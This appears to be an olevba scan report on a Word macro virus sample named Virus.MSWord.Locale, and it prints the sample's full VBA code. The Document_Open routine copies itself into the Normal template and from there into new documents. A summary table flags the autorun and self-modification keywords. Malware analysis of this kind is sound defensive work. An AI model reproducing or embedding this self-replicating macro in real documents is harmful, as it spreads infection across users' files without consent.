olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Locale-e23d7a44f588b87cc4c8986263d8a2f487072a22
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Locale-e23d7a44f588b87cc4c8986263d8a2f487072a22 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    Set newDocument = Documents(1)
    nextRoutine = "Document_Open"
    
    Set prevDocument = ActiveDocument
    Set nextDocument = NormalTemplate
    
    With nextDocument.VBProject.VBComponents
        For i = 1 To .Count
            If .Item(i).Type = 100 Then
                With .Item(i).CodeModule
                    If Not .Find("Sub " + nextRoutine + "()", 1, 1, .CountOfLines, 10) Then
                        With prevDocument.VBProject.VBComponents.Item(1).CodeModule
                            codeString = .Lines(.ProcStartLine(nextRoutine, vbext_pk_Proc), .ProcCountLines(nextRoutine, vbext_pk_Proc))
                        End With
                    End If
                    .AddFromString codeString
                    .ReplaceLine 1, "Private Sub " + nextRoutine + "()"
                    If prevDocument Is NormalTemplate Then
                        .ReplaceLine 5, "    Set prevDocument = ActiveDocument"
                        .ReplaceLine 6, "    Set nextDocument = NormalTemplate"
                    Else
                        .ReplaceLine 5, "    Set prevDocument = NormalTemplate"
                        .ReplaceLine 6, "    Set nextDocument = newDocument"
                    End If
                End With
            End If
        Next
    End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

